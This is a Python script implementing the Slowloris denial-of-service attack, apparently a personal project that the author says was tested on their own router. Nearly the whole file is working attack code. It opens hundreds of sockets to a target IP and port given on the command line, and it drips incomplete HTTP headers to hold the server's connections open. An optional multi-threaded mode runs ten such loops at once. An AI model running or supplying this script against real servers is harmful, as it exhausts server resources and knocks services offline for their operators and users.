#!/usr/bin/env python3 

###################################### DESCRIPTION #################################################################
# An excellent video from Computerphile (https://youtu.be/XiFkyR35v2Y) was the inspiration for writing 
# this script. The classic attack was written by Robert RSnake Hans in perl, back in 2009
# For details: https://en.wikipedia.org/wiki/Slowloris_(computer_security)
# I've followed this script: https://github.com/gkbrk/slowloris/blob/master/slowloris.py
# But tweaked some properties, e.g.: 
# 1.Kept the code as simple as possible; avoided any steps that I could not understand or found overdoing  
# 2.Added multi-threading for more intensive attack
# 
# -- This script is under development ......... Worked well on  my tp-link router. 
# Faquir Foysol   Date: February 26, 2020 8:15PM  
####################################################################################################################

# Code starts from here 

import socket
import random
import time
import logging
import argparse
import signal
import threading






####################################### Arguments and Globals ################################################### 

parser = argparse.ArgumentParser()

parser.add_argument("-i", "--ip", help="target server ip address")
parser.add_argument("-p", "--port", default= 80, help="target server port")
parser.add_argument("-v", "--verbose", help="verbose output ")
parser.add_argument("-t", help="enable multi threaded attack",action="store_true")
args = parser.parse_args()

logging.basicConfig(format="|%(asctime)s | %(message)s ", level=logging.DEBUG, datefmt="%d-%m-%Y %H:%M:%S")
#logging.debug("running script")


header =  "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 \
        (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"


socket_list = [] # list of initialised sockets 
socket_count = 300 # 150 to 200 sockets are enough

##################################################################################################################




def signal_handler(received_signal, frame):

    print("\nctrl+c pressed... Exiting the script")
    exit()


def create_socket(ip, port):
   
    sockObj = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # initialize an http/tcp type socket
    sockObj.settimeout(5) # time out for 5 seconds  
    sockObj.connect((ip, port))
    
    # send legal HTTP request and won't close the socket connection ...
    sockObj.send("GET / HTTP/1.1\r\n".encode("utf-8"))
    sockObj.send("{}\r\n".format(header).encode("utf-8"))

    return sockObj



def slow_loris():
    
    for count in range(socket_count): # first make harmless http get connections....
        try:
            
            logging.debug("connecting to socket no. %d" %count)
            sockObj = create_socket(ip, port)
    
        except socket.error as Err: # if any unexpected error occurs then break out
            #logging.debug(Err)
            break

        # Else append the connected sockets ..... 
        socket_list.append(sockObj)

    
    while True: # the infinite loop with continuous payload

        #print("In while loop")
        
        for active_socket in socket_list: 
            
            try:

                # connect with payload with random request string and integer..
                #print("Launching attack....")
                active_socket.send("shakib_khan {}\r\n".format(random.randint(1,401)).encode("utf-8"))
            
            
            except socket.error as Err:
               print("Error in socket exeption: %s" %Err)  
           
           #Note: Above snippet, without the following fresh connections produces Error 104 
           # and timed out that prevented me from obtaining ip addrress on 
           # my android device.... DHCP exhaustion ??? Needs a bit study.... 

        
        
        # reconnect with fresh connections to create more delay from the server side
        for connect in range(socket_count):
            try:
                new_socket = create_socket(ip,port)
                #print("new connection....")
    
            except socket.error as Err: # if any error then break the loop

                logging.debug(Err) 
                print("Breaking Loop...")
                break
    
        print("sleeping for 10 secs....")
        time.sleep(10) # sleep for 10 seconds delay and make the server wait for next connection

 
if __name__=="__main__":
    
    ip = args.ip
    port = int(args.port)

    signal.signal(signal.SIGINT, signal_handler)

    
    if args.t:
        attack_threads = []
        for i in range(1, 11): # 11 attacks with 11 infinite loop ... 

            attack = threading.Thread(target=slow_loris)
            attack_threads.append(attack)
            attack.start()

        for index, at_th in enumerate(attack_threads):
            print("joining thread: %d" %index)
            at_th.join()

    else:
        print("Launching single thread attack........\n")
        slow_loris()
